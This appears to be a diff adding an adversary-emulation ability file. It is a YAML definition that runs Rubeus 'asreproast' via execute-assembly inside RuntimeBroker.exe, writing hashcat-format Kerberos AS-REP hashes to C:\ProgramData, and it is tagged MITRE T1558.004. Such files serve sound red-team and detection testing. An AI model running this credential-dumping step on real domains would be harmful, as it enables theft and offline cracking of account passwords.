@@ -1,0 +1,21 @@
+id: 6ef19cb1-f8e5-4cdb-b3f1-98953174375f
+name: Run AS-REP roasting assembly
+description: |
+  Run the Rubeus assembly with the arguments "asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt"
+  via execute-assembly.
+tactic: credential-access
+technique:
+  id: T1558.004
+  name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
+metadata:
+  authors:
+    - khyberspache
+  tags: []
+  payloads:
+    rubeus_donut.bin: c56f7d7aaa1e37e7e45163fa5a4660dc6deb4215
+  enabled: true
+platforms:
+  windows:
+    execute-assembly:
+      command: '{"Data":"PAYLOAD.BYTES", "process":"RuntimeBroker.exe"}'
+      payload: rubeus_donut.bin
